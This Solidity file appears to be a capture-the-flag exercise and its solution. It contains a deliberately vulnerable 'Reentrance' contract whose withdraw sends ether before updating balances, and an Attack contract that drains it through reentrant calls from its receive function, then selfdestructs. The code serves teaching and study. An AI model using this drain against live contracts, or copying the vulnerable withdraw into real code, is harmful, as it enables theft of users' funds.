// The goal of this level is for you to steal all the funds from the contract.

//   Things that might help:

// Untrusted contracts can execute code where you least expect it.
// Fallback methods
// Throw/revert bubbling
// Sometimes the best way to attack a contract is with another contract.
// See the "?" page above, section "Beyond the console"


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}



contract Attack {

    IReentrance reentrance;
    uint constant AMOUNT = 0.001 ether;


    constructor(IReentrance  _reentrance) public {
       reentrance = _reentrance;

    }
    function hack() public payable {

      IReentrance(reentrance).donate{value:msg.value}(payable(address(this)));
      IReentrance(reentrance).withdraw(msg.value);
      selfdestruct(msg.sender);

    }

    function returnBal() external view returns (uint ){
              return address(reentrance).balance;
    }

    receive() external payable {

       uint currentBalance = address(msg.sender).balance;
        if (currentBalance > 0) {
            Reentrance(msg.sender).withdraw(AMOUNT);
        }

     }
}